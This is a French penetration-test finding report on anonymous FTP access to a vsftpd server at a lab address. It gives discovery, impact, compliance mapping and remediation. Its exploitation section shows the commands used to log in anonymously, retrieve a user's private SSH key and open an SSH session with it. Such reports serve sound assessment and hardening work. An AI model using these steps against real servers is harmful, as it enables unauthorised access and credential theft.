# VULN-03 — Unauthenticated Access Control (FTP anonyme)

**Sévérité :** MOYEN (CVSS 6.2)
**OWASP :** A07:2021 Identification and Authentication Failures
**CWE :** CWE-287 Improper Authentication
**Port :** 21/tcp (vsftpd 3.0.5)

---

## Description

Le serveur FTP accepte les connexions sans authentification via le compte générique `anonymous`. Une fois connecté, il est possible de naviguer dans les répertoires exposés et de télécharger des fichiers. La clé SSH privée d'Alice était accessible dans le répertoire partagé, ce qui ouvre un accès SSH direct sans mot de passe.

---

## Découverte

Nmap a révélé lors du scan :

```
ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

---

## Exploitation

### Connexion anonyme

```bash
ftp 10.10.10.83
# Name: anonymous
# Password: (vide ou n'importe quoi)
```

Résultat :

```
220 (vsFTPd 3.0.5)
Name (10.10.10.83:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

### Énumération du contenu

```bash
ftp> ls
# -> dossier alice/

ftp> cd alice
ftp> ls
# -> dossier files/

ftp> cd files
ftp> ls
# -> 2025_Les-bases-du-hacking.pdf
# -> 2025 id_rsa        <-- clé SSH privée d'Alice
# -> 2025_outil_scan_deports.pdf
# -> 2025_r2014_05_topics.pdf
```

### Récupération de la clé SSH

```bash
ftp> get id_rsa
# 2602 bytes received in 0.00s
ftp> exit
```

### Connexion SSH avec la clé

```bash
chmod 600 id_rsa
ssh -i id_rsa alice@10.10.10.83
```

Résultat :

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.16.8+kali-amd64 x86_64)
alice@2c69b2c55a12:~$
```

Accès SSH en tant qu'Alice obtenu sans connaitre son mot de passe.

---

## Impact

Accès direct à un compte utilisateur du serveur depuis internet, sans authentification. La clé SSH privée est l'équivalent d'un double des clés d'accès. Une fois récupérée, elle permet de se connecter à tout moment sans laisser de trace d'attaque sur le FTP.

**Impact GRC :** Violation du contrôle A.5.15 ISO 27001:2022 (Contrôle d'accès). Non-conformité NIS2 Article 21 sur les mesures de contrôle d'accès.

---

## Remédiation

```bash
# Dans /etc/vsftpd.conf
anonymous_enable=NO

# Redémarrage du service
sudo systemctl restart vsftpd
```

Et supprimer la clé privée du répertoire FTP immédiatement. Migrer vers SFTP (port 22) avec authentification obligatoire.

---

## Références

* [CWE-287](https://cwe.mitre.org/data/definitions/287.html)
* [vsftpd configuration](https://security.appspot.com/vsftpd.html)
* [OWASP A07:2021](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)

**MITRE ATT&CK :** T1078 Valid Accounts, T1083 File and Directory Discovery
